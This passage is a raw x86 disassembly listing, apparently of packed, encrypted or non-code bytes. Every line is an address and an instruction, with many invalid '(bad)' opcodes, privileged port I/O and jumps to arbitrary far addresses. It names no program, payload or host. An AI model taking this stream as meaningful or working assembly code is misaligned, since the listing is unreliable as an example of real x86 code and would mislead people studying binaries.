  42139a:	pop    esi
  42139b:	call   0x6d9e7e10
  4213a0:	call   0xee3d:0x97a4adbc
  4213a7:	shl    al,0xc6
  4213aa:	aam    0x88
  4213ac:	sbb    eax,0xbf866253
  4213b1:	xor    al,0xd7
  4213b3:	pop    ebp
  4213b4:	arpl   WORD PTR [ebx],bp
  4213b6:	or     eax,edi
  4213b8:	and    BYTE PTR [edi+0x23],cl
  4213bb:	mov    edx,0x8ba24f6d
  4213c0:	mov    ebp,0x5888adfd
  4213c5:	mov    dh,0xb1
  4213c7:	jecxz  0x4213e5
  4213c9:	sbb    bl,cl
  4213cb:	inc    edx
  4213cc:	scas   al,BYTE PTR es:[edi]
  4213cd:	pop    edi
  4213ce:	inc    ebp
  4213cf:	(bad)  
  4213d0:	xlat   BYTE PTR ds:[ebx]
  4213d1:	out    0x32,al
  4213d3:	loope  0x42139e
  4213d5:	inc    ecx
  4213d6:	in     al,0x4b
  4213d8:	nop
  4213d9:	mov    eax,ds:0x3e844d6a
  4213de:	adc    BYTE PTR [eax-0x1e],bl
  4213e1:	mov    edx,ss
  4213e3:	outs   dx,DWORD PTR ds:[esi]
  4213e4:	ins    BYTE PTR es:[edi],dx
  4213e5:	les    edx,FWORD PTR [ebx+ebx*1]
  4213e8:	rol    BYTE PTR [ebx-0x61],cl
  4213eb:	xor    ch,dl
  4213ed:	lods   al,BYTE PTR ds:[esi]
  4213ee:	mov    bl,0x71
  4213f0:	pop    ds
  4213f1:	mov    eax,0x58fc527c
  4213f6:	mov    cl,0x7c
  4213f8:	sbb    al,ch
  4213fa:	pusha  
  4213fb:	push   ss
  4213fc:	cld    
  4213fd:	dec    ebp
  4213fe:	mov    ch,0xfe
  421400:	mov    ebp,0x6c6e65c2
  421405:	pop    es
  421406:	pusha  
  421407:	push   ebx
  421408:	nop
  421409:	stos   DWORD PTR es:[edi],eax
  42140a:	cmp    BYTE PTR [eax+0x6a],dh
  42140d:	stc    
  42140e:	fadd   QWORD PTR [ecx-0x41]
  421411:	xchg   eax,esi
  421413:	or     ah,bl
  421415:	fnstcw WORD PTR [esi+0x34905450]
  42141b:	(bad)  
  42141c:	fstp   DWORD PTR [esi-0x9]
  42141f:	retf   0xb3ca
  421422:	xor    DWORD PTR [eax-0x61f7c7db],ebx
  421428:	sbb    ch,dh
  42142a:	cmp    edx,esp
  42142c:	add    edi,DWORD PTR [ebx+eiz*8+0x790c5c29]
  421433:	mov    al,ds:0x68078afa
  421438:	dec    esi
  421439:	stos   DWORD PTR es:[edi],eax
  42143a:	lds    edx,FWORD PTR [esi]
  42143c:	cs jg  0x4213d5
  42143f:	fimul  WORD PTR [ecx-0x6c]
  421442:	sub    al,0xd2
  421444:	push   ecx
  421445:	add    eax,edi
  421447:	(bad)  
  421448:	test   al,0x45
  42144a:	sub    BYTE PTR [edi-0x2403c2f6],cl
  421450:	pushf  
  421451:	shl    DWORD PTR [edi-0x637a14e5],cl
  421457:	push   ebp
  421458:	ins    BYTE PTR es:[edi],dx
  421459:	leave  
  42145a:	test   BYTE PTR ds:0x12b6b002,cl
  421460:	jb     0x421482
  421462:	push   cs
  421463:	pop    esi
  421464:	int3   
  421465:	push   eax
  421466:	mov    ds:0xdb63439,eax
  42146b:	int3   
  42146c:	imul   ecx,DWORD PTR [ecx],0x63431128
  421472:	in     al,dx
  421473:	nop
  421474:	xor    eax,DWORD PTR [ecx-0x2423517f]
  42147a:	rol    BYTE PTR [esi],0x6a
  42147d:	outs   dx,BYTE PTR ds:[esi]
  42147e:	(bad)  
  42147f:	daa    
  421480:	dec    edx
  421481:	cmp    al,0xff
  421483:	mov    dh,0x67
  421485:	pop    ebp
  421486:	stos   BYTE PTR es:[edi],al
  421487:	or     BYTE PTR [ebx+0x63],0x47
  42148b:	or     ebp,DWORD PTR ds:0x3934abb3
  421491:	mov    dl,0x29
  421493:	cdq    
  421494:	push   ss
  421495:	and    eax,0xaecb3d49
  42149a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42149b:	and    al,0x2d
  42149d:	mov    dl,0x4a
  42149f:	adc    eax,0xb2c08ae0
  4214a4:	xchg   BYTE PTR [edx],dh
  4214a6:	cld    
  4214a7:	inc    edi
  4214a8:	cmp    dl,BYTE PTR [edi-0x6b]
  4214ab:	mov    ecx,DWORD PTR [esi]
  4214ad:	mov    cl,0xb5
  4214af:	cli    
  4214b0:	sbb    eax,0xa2049329
  4214b5:	xor    bh,bl
  4214b7:	clc    
  4214b8:	pop    ebx
  4214b9:	fadd   DWORD PTR [edi-0x77a0c77e]
  4214bf:	add    DWORD PTR [ecx+0x2621e986],0xae354b79
  4214c9:	nop
  4214ca:	or     eax,0x1d710418
  4214cf:	test   BYTE PTR [esi],bh
  4214d1:	xlat   BYTE PTR ds:[ebx]
  4214d2:	mov    eax,0x5435807d
  4214d7:	outs   dx,DWORD PTR ds:[esi]
  4214d8:	jns    0x421551
  4214da:	arpl   WORD PTR [ebx],dx
  4214dc:	rcl    BYTE PTR [ecx],cl
  4214de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214df:	hlt    
  4214e0:	(bad)  
  4214e1:	out    dx,eax
  4214e2:	xchg   ebp,eax
  4214e3:	inc    esi
  4214e4:	je     0x42154a
  4214e6:	mov    al,0x8
  4214e8:	inc    ebx
  4214e9:	cdq    
  4214ea:	mov    ebp,0x890bfa6f
  4214ef:	test   BYTE PTR [edi],cl
  4214f1:	lods   eax,DWORD PTR ds:[esi]
  4214f2:	mov    edi,0xbc4b1b58
  4214f7:	ficomp DWORD PTR [esi+0x6a]
  4214fa:	or     al,0xec
  4214fc:	xchg   ebx,eax
  4214fd:	lea    ebp,[edx+0xf]
  421500:	loop   0x4214da
  421502:	push   ss
  421503:	push   ebx
  421504:	(bad)  
  421505:	daa    
  421506:	jb     0x4214f6
  421508:	fidivr WORD PTR [ebx]
  42150a:	cmp    BYTE PTR [esi-0x5d],dl
  42150d:	bound  edi,QWORD PTR [ecx+edx*4-0x70bb97f7]
  421514:	xchg   edx,eax
  421515:	fiadd  WORD PTR [edi-0x76089cea]
  42151b:	data16 (bad) 
  42151d:	pop    edx
  42151e:	inc    ecx
  42151f:	push   ds
  421520:	push   ecx
  421521:	adc    al,0x17
  421523:	inc    ecx
  421524:	adc    edx,DWORD PTR [eax-0x1f]
  421527:	or     eax,0xea068b47
  42152c:	xchg   ecx,eax
  42152d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42152e:	cmp    edi,DWORD PTR [edx]
  421530:	fmulp  st(5),st
  421532:	jle    0x421526
  421534:	addr16 in al,dx
  421536:	in     al,dx
  421537:	cdq    
  421538:	and    DWORD PTR [ecx-0x4c7db0b4],0x7e
  42153f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421540:	mov    cl,BYTE PTR [edx]
  421542:	cmp    BYTE PTR [esi],ah
  421544:	or     DWORD PTR [ebx],ebx
  421546:	pop    ds
  421547:	fldenv [eax-0x76]
  42154a:	adc    ecx,DWORD PTR [esi-0x3597a2b4]
  421550:	sub    edi,ebp
  421552:	pop    eax
  421553:	pop    ecx
  421554:	outs   dx,BYTE PTR ds:[esi]
  421555:	leave  
  421556:	and    BYTE PTR [ecx+eax*8],0x8f
  42155a:	test   eax,0x49527011
  42155f:	inc    eax
  421560:	sub    DWORD PTR [ecx+0x4574034f],0xffffffcc
  421567:	test   DWORD PTR [edx+0x49],0xade7425e
  42156e:	leave  
  42156f:	jecxz  0x421545
  421571:	neg    cl
  421573:	push   ss
  421574:	daa    
  421575:	inc    ecx
  421576:	out    0x9d,eax
  421578:	push   ss
  421579:	lea    ecx,[ecx-0x2d]
  42157c:	or     al,0x2c
  42157e:	sub    esi,DWORD PTR [edi+0x4eef1900]
  421584:	pop    ebx
  421585:	sbb    dl,BYTE PTR [esi-0x7ec31a08]
  42158b:	test   BYTE PTR [eax+0x74],ch
  42158e:	mov    es,WORD PTR [edx]
  421590:	outs   dx,BYTE PTR ds:[esi]
  421591:	jns    0x421600
  421593:	push   es
  421594:	push   ebx
  421595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421596:	and    dh,BYTE PTR ds:[esp+edx*8-0x35571a09]
  42159e:	rcl    DWORD PTR [edx],1
  4215a0:	fld    DWORD PTR gs:[ebp-0x759b46da]
  4215a7:	retf   0x7cb6
  4215aa:	mov    ?,ebp
  4215ac:	mov    ecx,0x1cbca65c
  4215b1:	push   0x5052b6b6
  4215b6:	aam    0xe
  4215b8:	bound  esp,QWORD PTR [edi+0x1c10afba]
  4215be:	nop
  4215bf:	shl    DWORD PTR [esi],cl
  4215c1:	outs   dx,DWORD PTR ds:[esi]
  4215c2:	mov    al,ds:0xa3210075
  4215c7:	mov    esp,?
  4215c9:	hlt    
  4215ca:	ret    0x26e4
  4215cd:	dec    esi
  4215ce:	mov    ds:0xe2da8f00,al
  4215d3:	xchg   esp,eax
  4215d4:	cmp    al,0xcd
  4215d6:	jne    0x4215bf
  4215d8:	push   ebx
  4215d9:	add    dl,BYTE PTR [esi-0x4f]
  4215dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215dd:	or     al,0x54
  4215df:	mov    ch,0x42
  4215e1:	sbb    al,0xd3
  4215e3:	out    0x33,al
  4215e5:	inc    esi
  4215e6:	or     edx,DWORD PTR [ebx+0x3056dcac]
  4215ec:	test   ecx,esp
  4215ee:	mov    ebp,0x7f722b58
  4215f3:	sti    
  4215f4:	xchg   edx,eax
  4215f5:	xchg   DWORD PTR [ebp+0x41],eax
  4215f8:	mov    esp,0xaf1b35b8
  4215fd:	jp     0x421646
  4215ff:	adc    ebx,DWORD PTR [edi+0x1]
  421602:	cmp    DWORD PTR [ecx+0x74],ebp
  421605:	xchg   edi,eax
  421606:	jecxz  0x4215e2
  421608:	pop    ebx
  421609:	xchg   ebp,eax
  42160a:	in     al,0xbf
  42160c:	jmp    0xed68b78f
  421611:	adc    edx,0xe81779e7
  421617:	iret   
  421618:	sahf   
  421619:	(bad)
  42161c:	(bad)  [ebx+0x19]
  42161f:	cmp    DWORD PTR [ebx],ebp
  421621:	mov    ecx,0xcd7dfbb1
  421626:	jp     0x421626
  421628:	test   BYTE PTR [esi+0xe],ch
  42162b:	call   FWORD PTR [esi-0x6a252149]
  421631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421632:	ins    BYTE PTR es:[edi],dx
  421633:	(bad)  
  421634:	aam    0xf6
  421636:	test   eax,0x80f2dcef
  42163b:	mov    ds:0x6c21f10f,al
  421640:	in     al,dx
  421641:	xchg   edx,eax
  421642:	sbb    al,0x66
  421644:	ds pusha 
  421646:	clc    
  421647:	stos   DWORD PTR es:[edi],eax
  421648:	adc    ah,BYTE PTR [eax]
  42164a:	adc    cl,dh
  42164c:	dec    edi
  42164d:	popf   
  42164e:	add    eax,0x36d47f00
  421653:	addr16 icebp 
  421655:	push   ebp
  421656:	ds mov esp,0xaf5344cd
  42165c:	in     al,dx
  42165d:	int3   
  42165e:	ja     0x42167b
  421660:	adc    esi,DWORD PTR [esi]
  421662:	into   
  421663:	fwait
  421664:	adc    BYTE PTR [eax+0x63],cl
  421667:	ss daa 
  421669:	addr16 retf 0x9af
  42166d:	retf   0xc7f5
  421670:	aaa    
  421671:	icebp  
  421672:	ja     0x421610
  421674:	push   ss
  421675:	int    0x7e
  421677:	jle    0x421667
  421679:	jno    0x4216ef
  42167b:	je     0x421642
  42167d:	pop    ebx
  42167e:	imul   eax,edx,0x96f5f3c2
  421684:	dec    esp
  421685:	or     cl,BYTE PTR [ecx]
  421687:	or     eax,0x79e6aea8
  42168c:	push   ebx
  42168d:	pushf  
  42168e:	in     eax,dx
  42168f:	ds out dx,eax
  421691:	jae    0x421704
  421693:	mov    al,0x74
  421695:	jmp    0xaa5a:0xb52cfea1
  42169c:	or     al,0xbd
  42169e:	adc    BYTE PTR [esi+ebp*8],dl
  4216a1:	in     al,0xe7
  4216a3:	mov    ah,0xe2
  4216a5:	jne    0x42169e
  4216a7:	sub    eax,0x5b0bd88d
  4216ac:	loope  0x421679
  4216ae:	(bad)  
  4216af:	ficom  DWORD PTR [esi]
  4216b1:	mov    edx,0xb6492295
  4216b6:	mov    ebp,0x7f571a2f
  4216bb:	add    DWORD PTR [edx],0xffffffe8
  4216be:	jge    0x4216df
  4216c0:	test   al,0x53
  4216c2:	jae    0x421706
  4216c4:	retf   0x2b5f
  4216c7:	(bad)  
  4216c8:	jge    0x42165e
  4216ca:	jnp    0x421692
  4216cc:	dec    eax
  4216cd:	in     eax,dx
  4216ce:	jl     0x42167c
  4216d0:	in     al,0xa8
  4216d2:	and    al,0xd6
  4216d4:	pop    edi
  4216d5:	cmp    BYTE PTR [eax],bl
  4216d7:	sub    ah,BYTE PTR [edx]
  4216d9:	in     eax,0xdb
  4216db:	scas   al,BYTE PTR es:[edi]
  4216dc:	inc    edi
  4216dd:	mov    al,0xc3
  4216df:	mov    al,ds:0x49670f18
  4216e4:	mov    ah,0xb
  4216e6:	sahf   
  4216e7:	mov    esp,0x2c7c0521
  4216ec:	mov    al,0x82
  4216ee:	ins    BYTE PTR es:[edi],dx
  4216ef:	inc    esi
  4216f0:	adc    cl,bl
  4216f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216f4:	leave  
  4216f5:	mov    esi,0xb05b9c59
  4216fa:	dec    edx
  4216fb:	bound  esi,QWORD PTR [edi-0x2e29bf28]
  421701:	out    0xf4,eax
  421703:	faddp  st(3),st
  421705:	add    eax,ebp
  421707:	jecxz  0x42171c
  421709:	sub    DWORD PTR [esi],edx
  42170b:	fild   QWORD PTR [ebx]
  42170d:	fnstenv [ecx]
  42170f:	inc    esi
  421710:	push   DWORD PTR [edx+0x594b553b]
  421716:	mov    bh,0xb2
  421718:	out    dx,al
  421719:	and    bh,dl
  42171b:	gs lahf 
  42171d:	pop    ecx
  42171e:	mov    ebx,0x4c44a2e5
  421723:	xor    eax,0x4dbe0f15
  421728:	ss add al,0x94
  42172b:	inc    ebx
  42172c:	jg     0x4216cb
  42172e:	mov    bh,BYTE PTR [esi-0x50]
  421731:	addr16 inc dx
  421734:	pop    esp
  421735:	aad    0x34
  421737:	ss das 
  421739:	cmp    BYTE PTR [ebx+0x58fbfaee],0xfc
  421740:	mov    eax,0x50092747
  421745:	call   0x1f3c95c5
  42174a:	sti    
  42174b:	lods   al,BYTE PTR ds:[esi]
  42174c:	scas   al,BYTE PTR es:[edi]
  42174d:	icebp  
  42174e:	test   eax,0xcf71989f
  421753:	xor    DWORD PTR [ebp+0x78],esp
  421756:	jmp    0x4216e2
  421758:	into   
  421759:	jae    0x421728
  42175b:	or     ecx,DWORD PTR [ecx+ebp*4]
  42175e:	out    0x2b,eax
  421760:	push   eax
  421761:	aad    0x1d
  421763:	out    0xfe,al
  421765:	mov    ebx,0xb33a672f
  42176a:	and    DWORD PTR [ebx+0x60],esp
  42176d:	xchg   DWORD PTR [ebp+0x2b],ebx
  421770:	dec    ecx
  421771:	jecxz  0x421766
  421773:	in     al,dx
  421774:	jmp    0x421797
  421776:	aas    
  421777:	cdq    
  421778:	pop    esp
  421779:	xor    ecx,0xffffffec
  42177c:	mov    dh,0x1d
  42177e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42177f:	out    0xd6,al
  421781:	retf   
  421782:	dec    edi
  421783:	or     eax,DWORD PTR [eax-0x1794ae29]
  421789:	sar    BYTE PTR [eax-0x4e],cl
  42178c:	mov    eax,0x6a36422b
  421791:	pop    ecx
  421792:	lahf   
  421793:	shl    BYTE PTR [edx+0x33],cl
  421796:	sahf   
  421797:	cmp    eax,0x3ca9402
  42179c:	mov    bh,0xeb
  42179e:	pushf  
  42179f:	pop    ds
  4217a0:	pop    esi
  4217a1:	or     DWORD PTR [ebx+0x49],0xa9e89b0f
  4217a8:	sub    bl,dh
  4217aa:	jge    0x4217de
  4217ac:	in     eax,0xa9
  4217ae:	add    BYTE PTR [edi],ah
  4217b0:	add    BYTE PTR [edx+0x3e],0xcb
  4217b4:	push   esi
  4217b5:	in     al,dx
  4217b6:	stos   DWORD PTR es:[edi],eax
  4217b7:	inc    ecx
  4217b8:	sub    edx,eax
  4217ba:	pop    ecx
  4217bb:	push   ebx
  4217bc:	cmp    eax,0xa61f282
  4217c1:	pop    esi
  4217c2:	fdiv   DWORD PTR [eax-0xdd7a205]
  4217c8:	or     BYTE PTR [edx-0x39],al
  4217cb:	icebp  
  4217cc:	or     BYTE PTR ds:0x5bc4cf76,dh
  4217d2:	push   edi
  4217d3:	aam    0xc3
  4217d5:	rol    DWORD PTR [ecx],cl
  4217d7:	mov    dl,0xba
  4217d9:	leave  
  4217da:	adc    edi,ecx
  4217dc:	out    0x9a,eax
  4217de:	mov    ch,0x64
  4217e0:	push   es
  4217e1:	fwait
  4217e2:	jecxz  0x421780
  4217e4:	or     eax,0x5540675e
  4217e9:	jmp    0xe443:0x9a33518c
  4217f0:	shr    BYTE PTR [esi+0x58e34011],0x2f
  4217f7:	sub    dl,BYTE PTR [eax]
  4217f9:	adc    ecx,DWORD PTR [edx+0x1f796f58]
  4217ff:	cli    
  421800:	loop   0x421820
  421802:	sbb    al,0x95
  421804:	or     BYTE PTR [eax+0x5bbc29ba],cl
  42180a:	dec    ebp
  42180b:	cld    
  42180c:	es retf 0xaeda
  421810:	dec    edi
  421811:	pop    edx
  421812:	jg     0x421817
  421814:	jnp    0x421818
  421816:	cmc    
  421817:	pop    esi
  421818:	(bad)  
  421819:	push   ss
  42181a:	int    0x27
  42181c:	aaa    
  42181d:	retf   0x6883
  421820:	inc    edx
  421821:	dec    ebp
  421822:	enter  0xfb3a,0x81
  421826:	lods   al,BYTE PTR ds:[esi]
  421827:	ins    DWORD PTR es:[edi],dx
  421828:	sub    ebx,ebx
  42182a:	stos   BYTE PTR es:[edi],al
  42182b:	loope  0x421892
  42182d:	jne    0x4217e7
  42182f:	fiadd  WORD PTR [esi+0x41c78327]
  421835:	stc    
  421836:	jno    0x421804
  421838:	sbb    dh,0x6b
  42183b:	fistp  QWORD PTR [ecx-0x4e]
  42183e:	int    0xd9
  421840:	jge    0x42184e
  421842:	stc    
  421843:	fld    QWORD PTR [eax]
  421845:	xlat   BYTE PTR ds:[ebx]
  421846:	jbe    0x421851
  421848:	cmc    
  421849:	push   ss
  42184a:	pushf  
  42184b:	aad    0x24
  42184d:	das    
  42184e:	mov    bl,0xf9
  421850:	inc    edi
  421851:	sbb    eax,0x2caefea6
  421856:	cli    
  421857:	(bad)  
  421858:	iret   
  421859:	pop    es
  42185a:	sbb    DWORD PTR [edx-0x657c51b1],edi
  421860:	iret   
  421861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421862:	cmp    DWORD PTR fs:[ebp+0x447a614],edx
  421869:	xor    DWORD PTR [esi+ebx*2-0x55],esp
  42186d:	retf   
  42186e:	and    cl,ah
  421870:	jo     0x4217f3
  421872:	mov    WORD PTR [ecx-0x50],cs
  421875:	std    
  421876:	daa    
  421877:	std    
  421878:	inc    edi
  421879:	ins    BYTE PTR es:[edi],dx
  42187a:	dec    ebx
  42187b:	jne    0x42183b
  42187d:	lahf   
  42187e:	rcl    BYTE PTR [ebx+0x18ad5fc1],cl
  421884:	test   dh,0xcd
  421887:	add    esi,DWORD PTR [ebp+0x15c4dcc2]
  42188d:	jne    0x4218fa
  42188f:	outs   dx,DWORD PTR ds:[esi]
  421890:	les    ecx,FWORD PTR [ebx-0x42]
  421893:	call   0x25a63f48
  421898:	popa   
  421899:	ret    0xbb2
  42189c:	cmp    eax,0xb332b93e
  4218a1:	push   edi
  4218a2:	jge    0x4218e9
  4218a4:	sbb    dh,ch
  4218a6:	mov    esi,0x417a83e8
  4218ab:	mov    esp,0xcf3f80be
  4218b0:	adc    ah,BYTE PTR [eax-0x1f5ec652]
  4218b6:	sbb    eax,0xca2a052d
  4218bb:	nop
  4218bc:	leave  
  4218bd:	pop    es
  4218be:	jo     0x421870
  4218c0:	add    eax,0xa2cda635
  4218c5:	xchg   ebp,eax
  4218c6:	psubusw mm0,QWORD PTR [ebp+0x41]
  4218ca:	inc    edx
  4218cb:	daa    
  4218cc:	popa   
  4218cd:	shr    BYTE PTR cs:[ebx+0x5f],1
  4218d1:	add    eax,0xf521eb3c
  4218d6:	pop    esp
  4218d7:	hlt    
  4218d8:	shl    BYTE PTR ds:0xcc43f7be,1
  4218de:	inc    esp
  4218df:	sbb    BYTE PTR [edx-0x7079dc7d],ah
  4218e5:	and    eax,0x167f9dc2
  4218ea:	icebp  
  4218eb:	lea    esi,[eax+0x37]
  4218ee:	ins    BYTE PTR es:[edi],dx
  4218ef:	clc    
  4218f0:	(bad)  
  4218f1:	pop    ds
  4218f2:	sbb    eax,DWORD PTR [edi]
  4218f4:	(bad)  
  4218f5:	fidiv  WORD PTR [ebp-0x68]
  4218f8:	inc    edx
  4218f9:	lods   al,BYTE PTR ds:[esi]
  4218fa:	jb     0x421972
  4218fc:	xchg   edi,eax
  4218fd:	xchg   esi,eax
  4218fe:	push   ecx
  4218ff:	cli    
  421900:	sar    DWORD PTR [eax+0x16],1
  421903:	xor    eax,0x6760c531
  421908:	sbb    ah,bl
  42190a:	stc    
  42190b:	add    eax,0xe18ca28f
  421910:	sahf   
  421911:	sbb    al,0x6e
  421913:	sbb    BYTE PTR ds:0x7f9b5061,ah
  421919:	clc    
  42191a:	jns    0x42189c
  42191c:	dec    ebp
  42191d:	ja     0x421989
  42191f:	add    BYTE PTR [esi+ecx*8+0x744347da],dl
  421926:	inc    ebp
  421927:	ret    0x6915
  42192a:	es test eax,0x716aa257
  421930:	mov    esp,0x71aa5626
  421935:	mov    bl,0x17
  421937:	sbb    bl,cl
  421939:	mov    ebp,0x35a41af3
  42193e:	xchg   BYTE PTR [esp+eiz*8],dl
  421941:	fisubr WORD PTR [ebx]
  421943:	cld    
  421944:	cli    
  421945:	clc    
  421946:	dec    eax
  421947:	fisttp WORD PTR [edx+0x42]
  42194a:	mov    eax,0x2f34fa1b
  42194f:	std    
  421950:	sub    eax,0x1271e711
  421955:	push   edx
  421956:	and    al,0xe0
  421958:	jns    0x421931
  42195a:	xchg   ebp,eax
  42195b:	cmp    eax,0xefa307c1
  421960:	aaa    
  421961:	mov    edi,0xd026b949
  421966:	fwait
  421967:	and    eax,0xa9ad9734
  42196c:	mov    DWORD PTR [ebx+ebx*8],ebp
  42196f:	lahf   
  421970:	dec    esp
  421971:	sbb    esp,ecx
  421973:	or     eax,0x9044092b
  421978:	into   
  421979:	cmp    dl,BYTE PTR [eax+0x39]
  42197c:	aas    
  42197d:	fwait
  42197e:	mov    edx,DWORD PTR [edx]
  421980:	cmp    eax,0x2eac3ce6
  421985:	repnz sub BYTE PTR [ebx+0x18],al
  421989:	add    al,0x47
  42198b:	inc    edi
  42198c:	test   BYTE PTR [edx+edx*1],0x61
  421990:	addr16 aaa 
  421992:	sbb    eax,0x3732c88b
  421997:	push   esp
  421998:	loopne 0x42197b
  42199a:	sahf   
  42199b:	popa   
  42199c:	repnz repz or esi,esi
  4219a0:	enter  0xf6f4,0x87
  4219a4:	or     al,0x47
  4219a6:	ss std 
  4219a8:	addr16 pusha 
  4219aa:	fs in  eax,0xc0
  4219ad:	jmp    0x93e:0xb8ff18a9
  4219b4:	push   ecx
  4219b5:	mov    edx,0x325b1854
  4219ba:	mov    DWORD PTR [eax-0x74],eax
  4219bd:	dec    ebx
  4219be:	jns    0x421966
  4219c0:	loope  0x4219d9
  4219c2:	icebp  
  4219c3:	repnz mov edx,0x9be1c90d
  4219c9:	push   edx
  4219ca:	fidivr DWORD PTR [ecx-0x2f]
  4219cd:	mov    eax,0x959bb3a6
  4219d2:	sub    ebp,DWORD PTR [edi+0x66]
  4219d5:	jb     0x4219b3
  4219d7:	pop    ecx
  4219d8:	lea    ebx,[ebx+0x6d]
  4219db:	ins    DWORD PTR es:[edi],dx
  4219dc:	jmp    0xeea6:0x9cb59abf
  4219e3:	ret    0x5c11
  4219e6:	repnz out dx,al
  4219e8:	fs jno 0x421a5e
  4219eb:	jge    0x421a3c
  4219ed:	mov    WORD PTR [ecx-0x6a],ss
  4219f0:	out    dx,eax
  4219f1:	push   ebx
  4219f2:	daa    
  4219f3:	dec    eax
  4219f4:	call   0x2803:0xfa892ea2
  4219fb:	jmp    0x4219ba
  4219fd:	push   esp
  4219fe:	cmp    cl,0x22
  421a01:	or     DWORD PTR [esi-0x723fb1b1],0xb38f3ff8
  421a0b:	add    BYTE PTR ds:0xe82bcdb,bh
  421a11:	mov    ch,0x1a
  421a13:	ja     0x421a6a
  421a15:	int3   
  421a16:	xor    BYTE PTR [edx],ch
  421a18:	sahf   
  421a19:	das    
  421a1a:	fst    QWORD PTR ds:0xb12090a3
  421a20:	jnp    0x421a7d
  421a22:	xchg   esi,eax
  421a23:	xor    al,0x18
  421a25:	aaa    
  421a26:	outs   dx,BYTE PTR ds:[esi]
  421a27:	fstp   TBYTE PTR ds:[ebp+0x1b4d4a68]
  421a2e:	mov    bl,0xf5
  421a30:	sub    BYTE PTR [ebp+0x32],al
  421a33:	jns    0x421a9d
  421a35:	mov    ebp,0xcb03673
  421a3a:	dec    esi
  421a3b:	pop    ss
  421a3c:	mov    fs,WORD PTR [ebx+edx*1+0x3d93422d]
  421a43:	sub    al,0x50
  421a45:	(bad)  
  421a46:	mov    al,0xa3
  421a48:	(bad)  
  421a49:	cli    
  421a4a:	popa   
  421a4b:	inc    ebx
  421a4c:	cwde   
  421a4d:	outs   dx,BYTE PTR ds:[esi]
  421a4e:	popa   
  421a4f:	nop
  421a50:	pop    ebp
  421a51:	stos   BYTE PTR es:[edi],al
  421a52:	inc    edx
  421a53:	mov    eax,es
  421a55:	fist   DWORD PTR [ebp-0x44]
  421a58:	mov    al,0xd9
  421a5a:	in     al,dx
  421a5b:	push   ebx
  421a5c:	fimul  DWORD PTR [eax-0x137e2a28]
  421a62:	into   
  421a63:	push   0x54679c45
  421a68:	stos   DWORD PTR es:[edi],eax
  421a69:	cmp    BYTE PTR [esi-0x66],0x8
  421a6d:	js     0x421a11
  421a6f:	cs (bad) 
  421a71:	xchg   ebx,eax
  421a72:	fwait
  421a73:	push   ebx
  421a74:	fs fyl2x 
  421a77:	mov    dl,0x1d
  421a79:	add    bl,al
  421a7b:	add    DWORD PTR [edi-0x45],ecx
  421a7e:	mov    bl,cl
  421a80:	test   al,0x8e
  421a82:	sahf   
  421a83:	mov    BYTE PTR [ebx],ah
  421a85:	rcr    dh,1
  421a87:	jo     0x421a5b
  421a89:	mov    bh,0xe
  421a8b:	xchg   edi,esp
  421a8d:	sbb    DWORD PTR [ecx+0x31],0xded16802
  421a94:	sub    al,0x39
  421a96:	sub    al,bh
  421a98:	or     edx,esp
  421a9a:	cmp    al,0x8d
  421a9c:	cmp    BYTE PTR [eax],0x8f
  421a9f:	mov    ecx,0xd40bbec6
  421aa4:	inc    edx
  421aa5:	pusha  
  421aa6:	jnp    0x421aa7
  421aa8:	scas   al,BYTE PTR es:[edi]
  421aa9:	mov    edi,0x4d593d6f
  421aae:	jnp    0x421b1b
  421ab0:	adc    eax,0xfb291743
  421ab5:	(bad)  [ecx-0x761fe8e3]
  421abb:	xor    al,0x6a
  421abd:	lods   al,BYTE PTR ds:[esi]
  421abe:	repz add cl,ah
  421ac1:	in     eax,0xf
  421ac3:	pop    ebp
  421ac4:	jmp    0x6866:0xedab879e
  421acb:	gs and ch,cl
  421ace:	shl    cl,cl
  421ad0:	or     DWORD PTR [edi+ebx*8],ebp
  421ad3:	call   0xe6672ac7
  421ad8:	cmp    DWORD PTR [edx],edi
  421ada:	and    al,0xf9
  421adc:	inc    esp
  421add:	mov    ebp,0xb6553fda
  421ae2:	aas    
  421ae3:	dec    edi
  421ae4:	retf   0xff64
  421ae7:	push   es
  421ae8:	mov    eax,0xfe7c907a
  421aed:	adc    ebx,ecx
  421aef:	addr16 dec esp
  421af1:	push   0xffffff84
  421af3:	loop   0x421aac
  421af5:	shl    BYTE PTR [edi+0x383aaa78],0xdc
  421afc:	push   eax
  421afd:	add    al,BYTE PTR [ebx]
  421aff:	lods   al,BYTE PTR ds:[esi]
  421b00:	(bad)  
  421b02:	mov    edx,0xbe1b98b4
  421b07:	mov    ds:0xaf03bb44,eax
  421b0c:	(bad)  
  421b0d:	out    0xc,al
  421b0f:	into   
  421b10:	jbe    0x421b7d
  421b12:	shr    DWORD PTR [ebx],0x71
  421b15:	mov    bh,0xd0
  421b17:	sbb    edi,ebx
  421b19:	xchg   BYTE PTR ds:0x4a74e892,bh
  421b1f:	xlat   BYTE PTR ds:[ebx]
  421b20:	bound  esi,QWORD PTR [esi]
  421b22:	popa   
  421b23:	clc    
  421b24:	pushf  
  421b25:	(bad)  
  421b27:	nop
  421b28:	fs aad 0x14
  421b2b:	in     eax,0x66
  421b2d:	push   edi
  421b2e:	fist   DWORD PTR [ebp-0x1e40053a]
  421b34:	test   BYTE PTR [esi+edi*1+0x6efda265],bh
  421b3b:	arpl   WORD PTR [ebx],di
  421b3d:	mov    ah,0x39
  421b3f:	cmc    
  421b40:	mov    edx,edi
  421b42:	sub    al,0x1a
  421b44:	outs   dx,DWORD PTR ds:[esi]
  421b45:	nop
  421b46:	aas    
  421b47:	adc    BYTE PTR [ebx+0x22f785e2],bl
  421b4d:	aas    
  421b4e:	cmp    BYTE PTR [edx-0x32],0xe1
  421b52:	dec    ebp
  421b53:	lods   eax,DWORD PTR ds:[esi]
  421b54:	test   al,0xa3
  421b56:	adc    ch,bh
  421b58:	jle    0x421bc9
  421b5a:	push   cs
  421b5b:	xor    al,0xeb
